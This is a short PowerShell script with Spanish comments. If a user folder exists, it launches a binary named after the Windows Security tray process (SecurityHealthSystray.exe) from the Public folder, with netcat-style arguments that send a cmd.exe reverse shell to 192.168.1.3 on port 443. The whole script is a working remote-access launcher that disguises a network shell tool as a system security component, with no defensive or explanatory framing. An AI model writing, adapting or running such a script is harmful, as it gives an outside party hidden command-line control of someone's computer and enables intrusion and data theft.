$targetPath = "C:\Users\ana"

# Comprobar si la ruta especificada existe
if (Test-Path -Path $targetPath -PathType Container) {
    # La ruta existe, ejecutar el comando
    $command = "C:\Users\Public\SecurityHealthSystray.exe"
    $arguments = "-nv 192.168.1.3 443 -e cmd.exe"
    Start-Process -FilePath $command -ArgumentList $arguments
} else {
    Write-Host "El directorio no existe: $targetPath"
}